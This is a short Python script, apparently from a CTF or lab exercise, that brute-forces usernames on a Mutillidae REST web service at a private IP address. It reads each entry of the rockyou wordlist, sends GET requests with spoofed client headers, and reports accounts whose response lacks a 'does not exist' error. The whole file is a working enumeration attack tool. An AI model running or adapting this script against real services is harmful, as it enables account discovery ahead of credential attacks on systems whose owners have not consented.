#################################################################
#Objective: 
# Brute-force for login enumeration 
#Description: 
# GET request to REST webservice through GET method to try enumerate usernames 
#Date:
# 25/07/2018
#################################################################

import requests

def file_lengthy(fname):
        i=0
        with open(fname,'rb') as f:
                for l in f:
                        i=i+1
        return i

#wordfile to use
wordfile = "/home/gr3g/ctf/wordlist/rockyou.txt"
wdLines = file_lengthy(wordfile)

print("Dictionnaire",wordfile,"has",wdLines,"entries.")

wd = open(wordfile)

#content return when error
match='does not exist'

#referer
header = {
        'Content-Type':'text/xml;charset=UTF-8',
        'Accept-Encoding':'gzip,deflate',
        'Host':'192.168.1.1',
        'User-Agent':'Apache-HttpClient/4.1.1 (java 1.5)',
        'Connection':'close'
} 

#to know how many usernames have been tested
i = 0

for entry in wd:
        entry = entry.rstrip("\n")
        
        #target URL
        url = "http://192.168.1.1/MUTILLIDAE/webservices/rest/ws-user-account.php?username=%s" % entry

        request = requests.get(url, headers = header).text
        #print(request)

        if match not in request: 
                print(entry,' is in database')

        i = i+1
        if i%10000==0:
                progress = (i / wdLines)*100
                print(progress,' % of the dic done')
